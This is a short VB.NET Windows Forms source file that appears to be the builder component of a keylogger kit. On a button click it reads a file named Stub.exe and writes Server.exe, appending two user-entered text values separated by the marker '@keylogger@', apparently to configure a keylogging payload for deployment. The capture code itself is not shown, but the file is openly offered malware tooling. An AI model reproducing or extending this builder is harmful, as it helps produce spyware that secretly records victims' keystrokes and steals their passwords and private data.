Imports System.IO
Public Class Form1
    Dim stub, text1, text2 As String
    Const FileSplit = "@keylogger@"
    Private Sub Form1_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
       
    End Sub

    Private Sub Button1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button1.Click
        text1 = TextBox1.Text
        text2 = TextBox2.Text
        FileOpen(1, Application.StartupPath & "\Stub.exe", OpenMode.Binary, OpenAccess.Read, OpenShare.Default)
        stub = Space(LOF(1))
        FileGet(1, stub)
        FileClose(1)
        If File.Exists("Server.exe") Then
            My.Computer.FileSystem.DeleteFile("Server.exe")
        End If
        FileOpen(1, Application.StartupPath & "\Server.exe", OpenMode.Binary, OpenAccess.ReadWrite, OpenShare.Default)
        FilePut(1, stub & FileSplit & text1 & FileSplit & text2)
        FileClose(1)
    End Sub
End Class
